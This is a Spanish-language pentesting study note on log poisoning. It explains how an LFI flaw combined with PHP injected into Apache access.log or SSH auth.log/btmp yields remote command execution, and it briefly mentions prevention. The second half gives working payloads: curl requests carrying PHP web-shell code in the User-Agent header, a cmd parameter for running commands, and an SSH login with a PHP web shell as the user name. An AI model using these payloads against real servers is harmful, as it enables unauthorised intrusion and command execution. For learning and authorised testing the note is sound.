
---
- tags: #vulnerabilidad #web 
----

El **Log Poisoning** es una técnica de ataque en la que un atacante **manipula** los **archivos de registro** (**logs**) de una aplicación web para lograr un resultado malintencionado. Esta técnica puede ser utilizada en conjunto con una vulnerabilidad **LFI** para lograr una **ejecución remota de comandos** en el servidor.

Como ejemplos para esta clase, trataremos de envenenar los recursos ‘**auth.log**‘ de **SSH** y ‘**access.log**‘ de **Apache**, comenzando mediante la explotación de una vulnerabilidad LFI primeramente para acceder a estos archivos de registro. Una vez hayamos logrado acceder a estos archivos, veremos cómo manipularlos para incluir código malicioso.

En el caso de los logs de SSH, el atacante puede inyectar código PHP en el campo de **usuario** durante el proceso de autenticación. Esto permite que el código se registre en el log ‘**auth.log**‘ de SSH y sea interpretado en el momento en el que el archivo de registro sea leído. De esta manera, el atacante puede lograr una ejecución remota de comandos en el servidor.

En el caso del archivo ‘**access.log**‘ de Apache, el atacante puede inyectar código PHP en el campo **User-Agent** de una solicitud HTTP. Este código malicioso se registra en el archivo de registro ‘access.log’ de Apache y se ejecuta cuando el archivo de registro es leído. De esta manera, el atacante también puede lograr una ejecución remota de comandos en el servidor.

Cabe destacar que en algunos sistemas, el archivo ‘**auth.log**‘ no es utilizado para registrar los eventos de autenticación de SSH. En su lugar, los eventos de autenticación pueden ser registrados en archivos de registro con diferentes nombres, como ‘**btmp**‘.

Por ejemplo, en sistemas basados en Debian y Ubuntu, los eventos de autenticación de SSH se registran en el archivo ‘auth.log’. Sin embargo, en sistemas basados en Red Hat y CentOS, los eventos de autenticación de SSH se registran en el archivo ‘btmp’. Aunque a veces pueden haber excepciones.

Para prevenir el Log Poisoning, es importante que los desarrolladores limiten el acceso a los archivos de registro y aseguren que estos archivos se almacenen en un lugar seguro. Además, es importante que se valide adecuadamente la entrada del usuario y se filtre cualquier intento de entrada maliciosa antes de registrarla en los archivos de registro.

---

- Si observamos que tenemos un LFI (local file inclusion) deberíamos comprobar si tenemos acceso a los logs del sistema.
``` url
/var/log/apache2/access.log
```
	esta ruta se trata de un ejemplo, deberian existir mas logs de diferentes servicios, las rutas suelen estar en las predefinidas dentro de /var/log/ pero el usuario podria cambiar las rutas para los logs asi que podriamos intentar buscarlas en otros sitios.

- Para realizar un envenenamiento del log en una pagina PHP podríamos intentar aprovecharnos de uno de los headers que es el user agent de esta manera:
``` bash
curl -s -X GET "<url-objetivo>" -H "User-Agent: <?php system('whoami'); ?>"
```
 si se están interpretando las funciones php en el servidor deberíamos de poder ver en el log directamente el comando ejecutado.

- Si comprobamos que tenemos ejecucion de comandos php otra cosa que podemos probar es a ver una lista de funciones php permitidas;
```bash
curl -s -X GET "<url-objetivo>" -H "User-Agent: <?php phpinfo(); ?>"
```
   ***OJO esta función nos muestra todo lo relevante de php pero puede corromper el log y dejarlo inservible.***

-Ejecución remota de comandos **RCE**, una vez comprobamos que podemos envenenar el log podremos ejecutar comandos remotos con este comando:
```bash
curl -s -X GET "<url-objetivo>" -H "User-Agent: <?php system(\$_GET['cmd']) ?>"
```
en la ruta hay que añadirle justo al final: 
```url
&cmd=<comando a ejecutar>
```

- Por ultimo veremos como envenenar un log de **ssh**, si tuviéramos permiso para ver el log en la ruta /var/log# btmp podríamos ver los logs generados al intentar conectarnos por ssh mediante el comando:
```bash
ssh <usuario>@<ip-objetivo>
```
de esta manera podríamos intentar injectar comandos por ejemplo en el campo del usuario:
```bash
ssh '<?php system(\$_GET['cmd']) ?>'@<ip-objetivo>
```
Una vez envenenado el log si volvemos a acceder a el desde el navegador y al final de la ruta el concatenamos el comando:
```url
&cmd=<comando a ejecutar>
```
podremos ver como ejecutamos los comandos de manera remota
